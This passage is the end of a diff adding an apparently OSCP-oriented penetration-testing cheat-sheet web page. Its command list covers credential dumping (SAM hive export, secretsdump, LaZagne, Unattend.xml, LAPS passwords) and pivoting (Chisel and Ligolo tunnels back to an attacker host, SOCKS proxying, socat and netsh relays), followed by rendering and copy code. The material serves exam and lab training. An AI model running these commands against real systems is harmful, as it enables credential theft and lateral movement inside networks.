+          {l:'SAM dump (offline)',     c:'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\SECURITY'},
+          {l:'Impacket local dump',    c:'impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY'},
+          {l:'Browser creds',          c:'.\LaZagne.exe all'},
+          {l:'Credential files',      c:'dir /s /b C:\\Users\\*password*\ndir /s /b C:\\Users\\*cred*'},
+          {l:'Unattend.xml',          c:'type C:\\Windows\\Panther\\Unattend.xml\ntype C:\\Windows\\sysprep\\sysprep.xml'},
+          {l:'LAPS (if installed)',    c:'Get-ADComputer -Filter * -Properties ms-mcs-admpwd | select name,"ms-mcs-admpwd"'},
+        ]
+      },
+      {
+        title:'Pivoting',
+        cmds:[
+          {l:'SSH local port fwd',     c:'ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@{IP}'},
+          {l:'SSH dynamic SOCKS',      c:'ssh -D 9050 user@{IP}\n# Then use: proxychains nmap ...'},
+          {l:'Chisel (server Kali)',   c:'chisel server -p 8001 --reverse'},
+          {l:'Chisel (client victim)', c:'./chisel client {LHOST}:8001 R:{LPORT}:127.0.0.1:{PORT}'},
+          {l:'Chisel SOCKS (server)',  c:'chisel server -p 8001 --reverse --socks5'},
+          {l:'Chisel SOCKS (client)',  c:'./chisel client {LHOST}:8001 R:1080:socks'},
+          {l:'Proxychains config',     c:'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'},
+          {l:'Proxychains use',        c:'proxychains nmap -sT -Pn INTERNAL_IP\nproxychains crackmapexec smb INTERNAL_IP'},
+          {l:'Ligolo-ng (agent)',       c:'./agent -connect {LHOST}:11601 -ignore-cert'},
+          {l:'Ligolo-ng (proxy)',       c:'./proxy -selfcert; session; start'},
+          {l:'Socat relay (TCP)',       c:'socat TCP-LISTEN:{LPORT},fork TCP:TARGET_IP:TARGET_PORT'},
+          {l:'netsh (Windows)',         c:'netsh interface portproxy add v4tov4 listenport={LPORT} listenaddress=0.0.0.0 connectport=TARGET_PORT connectaddress=TARGET_IP'},
+        ]
+      },
+      {
+        title:'Useful Tools (Kali)',
+        cmds:[
+          {l:'searchsploit',          c:'searchsploit KEYWORD\nsearchsploit -m EDB_ID\nsearchsploit -u  # update'},
+          {l:'GTFOBins lookup',       c:'# https://gtfobins.github.io\n# Search for SUID/sudo binary name'},
+          {l:'SecLists location',     c:'ls /usr/share/seclists/'},
+          {l:'Common wordlists',       c:'ls /usr/share/wordlists/'},
+          {l:'Impacket scripts',       c:'ls /usr/share/doc/python3-impacket/examples/'},
+          {l:'Netcat listen',          c:'nc -lvnp {LPORT}'},
+          {l:'Python web server',      c:'python3 -m http.server 8000'},
+          {l:'tcpdump capture',        c:'sudo tcpdump -i tun0 -w capture.pcap'},
+        ]
+      },
+    ]
+  },
+];
+
+// ================================================================
+// STATE
+// ================================================================
+let activeCat = 'recon';
+const notes = {};  // section key -> note text
+
+function getVars(){
+  return {
+    IP:    document.getElementById('ip').value.trim()    || '{IP}',
+    PORT:  document.getElementById('port').value.trim()  || '{PORT}',
+    LHOST: document.getElementById('lhost').value.trim() || '{LHOST}',
+    LPORT: document.getElementById('lport').value.trim() || '{LPORT}',
+  };
+}
+
+function fill(cmd, vars){
+  return cmd
+    .replace(/\{IP\}/g,    vars.IP)
+    .replace(/\{PORT\}/g,  vars.PORT)
+    .replace(/\{LHOST\}/g, vars.LHOST)
+    .replace(/\{LPORT\}/g, vars.LPORT);
+}
+
+function highlight(cmd, vars, query){
+  let s = cmd
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+  // Color variables
+  const ip    = vars.IP    !== '{IP}'    ? escRx(vars.IP)    : escRx('{IP}');
+  const port  = vars.PORT  !== '{PORT}'  ? escRx(vars.PORT)  : escRx('{PORT}');
+  const lhost = vars.LHOST !== '{LHOST}' ? escRx(vars.LHOST) : escRx('{LHOST}');
+  const lport = vars.LPORT !== '{LPORT}' ? escRx(vars.LPORT) : escRx('{LPORT}');
+
+  s = s.replace(new RegExp(ip,   'g'), m=>`<span class="hi-ip">${m}</span>`);
+  s = s.replace(new RegExp(port, 'g'), m=>`<span class="hi-port">${m}</span>`);
+  s = s.replace(new RegExp(lhost,'g'), m=>`<span class="hi-lhost">${m}</span>`);
+  s = s.replace(new RegExp(lport,'g'), m=>`<span class="hi-lport">${m}</span>`);
+
+  // Search highlight
+  if(query){
+    const rx = new RegExp(`(${escRx(query)})`, 'gi');
+    s = s.replace(rx, '<mark>$1</mark>');
+  }
+  return s;
+}
+
+function escRx(s){ return s.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'); }
+
+function clearSearch(){
+  document.getElementById('search').value = '';
+  document.getElementById('ip').value = '';
+  document.getElementById('port').value = '';
+  document.getElementById('lhost').value = '';
+  document.getElementById('lport').value = '';
+  render();
+}
+
+// ================================================================
+// RENDER
+// ================================================================
+function render(){
+  renderSidebar();
+  renderMain();
+}
+
+function renderSidebar(){
+  const sb = document.getElementById('sidebar');
+  sb.innerHTML = CATS.map(cat=>`
+    <button class="cat-btn${cat.id===activeCat?' active':''}" onclick="setcat('${cat.id}')">
+      <span class="icon">${cat.icon}</span>${cat.label}
+    </button>
+  `).join('');
+}
+
+function setcat(id){
+  activeCat = id;
+  render();
+  document.getElementById('main').scrollTop = 0;
+}
+
+function renderMain(){
+  const query = document.getElementById('search').value.trim().toLowerCase();
+  const vars  = getVars();
+
+  // If searching, show across all cats; else show active cat
+  let catsToRender = query
+    ? CATS
+    : CATS.filter(c=>c.id===activeCat);
+
+  let html = '';
+
+  for(const cat of catsToRender){
+    let catHtml = '';
+
+    for(const sec of cat.sections){
+      // Filter commands by query
+      const matchedCmds = query
+        ? sec.cmds.filter(cmd=>
+            cmd.l.toLowerCase().includes(query) ||
+            fill(cmd.c, vars).toLowerCase().includes(query)
+          )
+        : sec.cmds;
+
+      if(!matchedCmds.length) continue;
+
+      const secKey = cat.id + '_' + sec.title;
+      const noteVal = (notes[secKey]||'').replace(/"/g,'&quot;');
+
+      catHtml += `<div class="section">
+        <div class="section-title">
+          ${sec.title}
+          ${sec.tag?`<span class="stag">${sec.tag}</span>`:''}
+        </div>
+        ${matchedCmds.map((cmd,i)=>{
+          const filled = fill(cmd.c, vars);
+          const displayed = highlight(filled, vars, query);
+          const cmdId = `${secKey}_${i}`;
+          return `<div class="cmd-row">
+            <div class="cmd-label" title="${cmd.l}">${cmd.l}</div>
+            <code class="cmd-box" onclick="copyCmd(this,'${encodeURIComponent(filled)}')">${displayed}</code>
+            <button class="copy-btn" id="cp_${cmdId}" onclick="copyCmd(document.getElementById('cp_${cmdId}').previousElementSibling,'${encodeURIComponent(filled)}')">Copy</button>
+          </div>`;
+        }).join('')}
+        <div class="note-row" style="margin-left:135px">
+          <textarea class="note-area" rows="1" placeholder="Notes for this section..."
+            oninput="saveNote('${secKey}',this)"
+            onfocus="this.rows=3" onblur="this.rows=1"
+          >${noteVal}</textarea>
+        </div>
+      </div>`;
+    }
+
+    if(!catHtml) continue;
+
+    if(query){
+      html += `<div style="margin-bottom:.25rem;font-size:.72rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.08em">${cat.icon} ${cat.label}</div>`;
+    } else {
+      html += `<div class="cat-header">
+        <div class="cat-icon">${cat.icon}</div>
+        <div><div class="cat-name">${cat.label}</div><div class="cat-desc">${cat.desc}</div></div>
+      </div>`;
+    }
+    html += catHtml;
+  }
+
+  if(!html){
+    html = `<div class="empty"><div class="big">🔍</div>No commands match "<strong>${query}</strong>"</div>`;
+  }
+
+  document.getElementById('main').innerHTML = html;
+}
+
+// ================================================================
+// COPY
+// ================================================================
+function copyCmd(el, encoded){
+  const text = decodeURIComponent(encoded);
+  navigator.clipboard.writeText(text).then(()=>{
+    const btn = el.nextElementSibling || el;
+    if(btn && btn.classList.contains('copy-btn')){
+      const orig = btn.textContent;
+      btn.textContent = '✓ Copied';
+      btn.classList.add('copied');
+      setTimeout(()=>{ btn.textContent = orig; btn.classList.remove('copied'); }, 1500);
+    }
+  }).catch(()=>{
+    // Fallback
+    const ta = document.createElement('textarea');
+    ta.value = text; document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+}
+
+// ================================================================
+// NOTES
+// ================================================================
+function saveNote(key, el){
+  notes[key] = el.value;
+  // Persist to localStorage
+  try{ localStorage.setItem('oscp_notes', JSON.stringify(notes)); }catch(e){}
+}
+
+function loadNotes(){
+  try{
+    const saved = localStorage.getItem('oscp_notes');
+    if(saved){ Object.assign(notes, JSON.parse(saved)); }
+  }catch(e){}
+}
+
+// ================================================================
+// INIT
+// ================================================================
+loadNotes();
+render();
+</script>
+</body>
+</html>
